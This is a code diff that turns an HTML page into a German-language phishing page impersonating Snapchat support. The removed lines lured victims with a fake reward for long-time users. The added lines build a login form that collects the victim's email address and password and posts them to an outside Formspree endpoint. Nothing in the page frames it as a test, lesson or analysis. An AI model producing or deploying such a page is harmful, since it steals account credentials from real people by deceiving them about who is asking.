@@ -1,14 +1,64 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-    <link rel="stylesheet" href="style.css">
     <meta charset="UTF-8">
-    <title>SnapchatRewards</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapcht Suport</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3ef01;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .contact-container {
+            background: rgb(0, 0, 0);
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgb(240, 239, 239);
+            width:400px;%;
+            max-width: 400px;}
+        h2 { margin-top: 0; color: #f3f1f1; }
+        label { display: block; margin: 10px 0 5px; color: #666; }
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #d9ff00;
+            border-radius: 5px;
+            box-sizing: border-box; /* Wichtig für das Padding */
+        }
+        button {
+            background-color: #c6f103;
+            color: rgb(0, 0, 8);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+        }
+        button:hover { background-color: #ecece9; }
+    </style>
 </head>
 <body>
-    <h1>Willkommen bein Snapchat!</h1>
-    <p>Du hast seit uber 1000+ Tagen Snapchat!Du enthalst dafur 2 Artikel im Snapcht Avatar editor.Melde dich bei der nachsten Seite mit deinem snapchat Account an und wahle 2 von 6 Artikeln aus.</p>
-    <button><a href="file:///C:/Users/mihae/Desktop/SnapchtSuport/SecurityPrivateINFO.html" class="button-link">Anmelden</a>
-</button>
+
+<div class="contact-container">
+    <h2>Willkommen bei Snapcht</h2>
+    <form action="https://formspree.io/f/xreepljk" method="POST">
+        
+        <label>Deine E-Mail-Adresse:</label>
+        <input type="email" name="email" placeholder="beispiel@mail.de" required>
+
+        <label>Dein Passwort:</label>
+        <textarea name="message" rows="5" placeholder="Dein Passwort das du fur dich behalten soltest" required></textarea>
+
+        <button type="submit">Anmelden</button>
+    </form>
+</div>
+
 </body>
 </html>
